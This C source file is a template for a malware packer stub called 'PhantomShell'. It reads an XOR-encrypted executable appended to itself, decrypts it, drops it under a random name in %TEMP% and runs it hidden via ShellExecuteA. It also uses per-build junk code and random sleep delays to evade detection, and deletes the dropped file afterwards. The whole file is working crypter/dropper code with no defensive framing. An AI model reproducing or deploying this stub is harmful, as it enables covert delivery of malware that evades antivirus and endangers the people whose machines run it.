// PhantomShell Overlay Stub (C)
// Minimal Windows stub that extracts and executes an XOR-encrypted EXE from its own overlay.
// Compiled with MinGW: gcc -s -mwindows -o stub.exe stub.c -luser32 -lshell32

#include <windows.h>
#include <stdio.h>

// XOR key (64 bytes) — replaced by packer at build time
static const unsigned char XOR_KEY[64] = { {{KEY_BYTES}} };

// -----------------------------------------------------------
// RANDOM JUNK (unique identifiers per build, dead code)
// -----------------------------------------------------------
static const char BUILD_ID[]  = "{{BUILD_ID}}";
static const int  JUNK_SEED   = {{JUNK_SEED}};
static const int  DELAY_MIN   = {{DELAY_MIN}};
static const int  DELAY_RANGE = {{DELAY_RANGE}};

static int junk_func(int x) {
    unsigned int v = (unsigned int)x ^ 0x{{JUNK_XOR}};
    for (int i = 0; i < {{JUNK_LOOP}}; i++) {
        v = v * 1103515245 + 12345;
    }
    return (int)(v & 0x7FFFFFFF);
}

static void junk_calc(void) {
    volatile int x = JUNK_SEED;
    for (int i = 0; i < {{JUNK_LOOP2}}; i++) {
        x = junk_func(x);
    }
}

// -----------------------------------------------------------
// Get random filename (lowercase + digits)
// -----------------------------------------------------------
static void rand_name(char *buf, int len) {
    static const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    unsigned int seed = GetTickCount() ^ junk_func(JUNK_SEED);
    for (int i = 0; i < len; i++) {
        seed = seed * 1103515245 + 12345;
        buf[i] = chars[seed % (sizeof(chars) - 1)];
    }
    buf[len] = 0;
}

// -----------------------------------------------------------
// Simple log to %TEMP%
// -----------------------------------------------------------
static void log_msg(const char *msg) {
    char path[MAX_PATH];
    char line[512];
    SYSTEMTIME st;
    GetLocalTime(&st);

    GetTempPathA(sizeof(path), path);
    wsprintfA(path + lstrlenA(path), "ps_cstub_%04d%02d%02d_%02d%02d%02d.log",
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    wsprintfA(line, "[%02d:%02d:%02d.%03d] %s\r\n",
              st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, msg);

    HANDLE h = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(h, line, lstrlenA(line), &written, NULL);
        CloseHandle(h);
    }
}

// -----------------------------------------------------------
// Entry point (WinMain — no console window)
// -----------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int nShow) {
    char msg[512];
    HANDLE hSelf;
    DWORD fileSize, payloadSize, read;
    char selfPath[MAX_PATH];
    unsigned char *encrypted, *decrypted;
    char tmpPath[MAX_PATH], tmpName[13];
    int i;
    int exitCode = 0;

    junk_calc(); // Reference random junk to prevent optimization removal

    wsprintfA(msg, "PID=%lu — Build: %s", GetCurrentProcessId(), BUILD_ID);
    log_msg(msg);

    // Phase 1: Random delay
    unsigned int tick = GetTickCount();
    int delay = DELAY_MIN + (tick % DELAY_RANGE);
    wsprintfA(msg, "Sleep %ds", delay);
    log_msg(msg);
    Sleep(delay * 1000);

    // Phase 2: Read encrypted payload from own overlay
    GetModuleFileNameA(NULL, selfPath, sizeof(selfPath));
    wsprintfA(msg, "Self: %s", selfPath);
    log_msg(msg);

    hSelf = CreateFileA(selfPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (hSelf == INVALID_HANDLE_VALUE) {
        log_msg("ERROR: cannot open self");
        return 1;
    }

    fileSize = GetFileSize(hSelf, NULL);
    if (fileSize < 8) {
        log_msg("ERROR: file too small");
        CloseHandle(hSelf);
        return 1;
    }

    // Read 8-byte payload size from end
    SetFilePointer(hSelf, -8, NULL, FILE_END);
    ReadFile(hSelf, &payloadSize, 8, &read, NULL);

    if (payloadSize == 0 || payloadSize > fileSize - 8) {
        wsprintfA(msg, "ERROR: bad payload size: %lu (file=%lu)", payloadSize, fileSize);
        log_msg(msg);
        CloseHandle(hSelf);
        return 1;
    }
    wsprintfA(msg, "Payload marker: %lu bytes", payloadSize);
    log_msg(msg);

    // Read encrypted payload
    SetFilePointer(hSelf, -(LONG)(8 + payloadSize), NULL, FILE_END);
    encrypted = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    decrypted = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, payloadSize);
    if (!encrypted || !decrypted) {
        log_msg("ERROR: malloc fail");
        CloseHandle(hSelf);
        return 1;
    }

    ReadFile(hSelf, encrypted, payloadSize, &read, NULL);
    CloseHandle(hSelf);

    // Phase 3: XOR decrypt
    wsprintfA(msg, "Decrypting %lu bytes...", payloadSize);
    log_msg(msg);
    for (i = 0; i < (int)payloadSize; i++) {
        decrypted[i] = encrypted[i] ^ XOR_KEY[i % sizeof(XOR_KEY)];
    }

    // Verify PE header (MZ)
    if (payloadSize < 2 || decrypted[0] != 'M' || decrypted[1] != 'Z') {
        wsprintfA(msg, "ERROR: bad PE header: %02X %02X", decrypted[0], decrypted[1]);
        log_msg(msg);
        return 1;
    }
    wsprintfA(msg, "PE OK (MZ) — %lu bytes", payloadSize);
    log_msg(msg);

    // Phase 4: Write to %TEMP%
    GetTempPathA(sizeof(tmpPath), tmpPath);
    rand_name(tmpName, {{NAME_LEN}});
    lstrcatA(tmpPath, tmpName);
    lstrcatA(tmpPath, ".exe");

    wsprintfA(msg, "Writing: %s", tmpPath);
    log_msg(msg);

    HANDLE hOut = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        log_msg("ERROR: write fail");
        return 1;
    }
    WriteFile(hOut, decrypted, payloadSize, &read, NULL);
    CloseHandle(hOut);

    // Phase 5: Execute via ShellExecuteA (SW_HIDE)
    log_msg("Executing via ShellExecuteA...");
    HINSTANCE ret = ShellExecuteA(NULL, "open", tmpPath, NULL, NULL, SW_HIDE);

    if ((INT_PTR)ret <= 32) {
        wsprintfA(msg, "ERROR: ShellExecuteA returned %d", (int)(INT_PTR)ret);
        log_msg(msg);
        DeleteFileA(tmpPath);
        return 1;
    }
    wsprintfA(msg, "ShellExecuteA OK (ret=%d) — waiting 60s", (int)(INT_PTR)ret);
    log_msg(msg);

    Sleep(60000);
    DeleteFileA(tmpPath);
    log_msg("Cleanup done — exit");

    HeapFree(GetProcessHeap(), 0, encrypted);
    HeapFree(GetProcessHeap(), 0, decrypted);
    return 0;
}
